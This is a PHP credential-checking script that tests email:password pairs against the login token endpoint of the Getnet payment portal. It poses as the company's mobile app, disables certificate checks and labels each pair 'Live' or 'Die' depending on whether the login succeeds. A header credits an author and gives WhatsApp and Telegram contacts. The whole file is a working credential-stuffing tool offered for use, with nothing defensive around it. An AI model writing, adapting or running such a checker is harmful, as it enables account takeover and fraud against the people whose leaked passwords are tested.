<?php
error_reporting(0);
/*
* @𝓐𝓾𝓽𝓱𝓸𝓻   𝓟 𝓾 𝓰 𝓷 𝓸
*
* 𝓒𝓸𝓷𝓽𝓪𝓬𝓽   𝓦𝓱𝓪𝓽𝓼𝓪𝓹𝓹  >> (61) 9603-7036 
* 𝓒𝓸𝓷𝓽𝓪𝓬𝓽   𝓣𝓮𝓵𝓮𝓰𝓻𝓪𝓶  >> 𝓽.𝓶𝓮/𝓹𝓾𝓰𝓷𝓸_𝓯𝓬
*
*/

function getStr($string, $start, $end) {
 $str = explode($start, $string);
 $str = explode($end, $str[1]);  
 return $str[0];
}

function multiexplode($string) {
 $delimiters = array("|", ";", ":", "/", "»", "«", ">", "<");
 $one = str_replace($delimiters, $delimiters[0], $string);
 $two = explode($delimiters[0], $one);
 return $two;
}

$lista = $_GET['lista'];
$email = multiexplode($lista)[0];
$senha = multiexplode($lista)[1];

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://servicosportais.getnet.com.br/auth/realms/external/protocol/openid-connect/token');
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'Host: servicosportais.getnet.com.br',
  'User-Agent: okhttp/3.12.0',
  'Content-Type: application/x-www-form-urlencoded',
  'Connection: keep-alive',
));
curl_setopt($ch, CURLOPT_POSTFIELDS,'username='.$email.'&password='.$senha.'&client_id=superget-mobile&grant_type=password');
$p1 = curl_exec($ch);

if(strpos($p1,'access_token')){
  $token = getStr($p1, 'access_token":"','"');
  echo "Live: $lista";

}elseif(stripos($p1,'Invalid user credentials')){
  echo "Die: $lista Retorno: Invalid user credentials";
}elseif(stripos($p1,'Access Denied')){
  echo "Error: $lista Retorno: Proxy";
}else{
  echo "Error: $lista Retorno: Desconhecido";
}

?>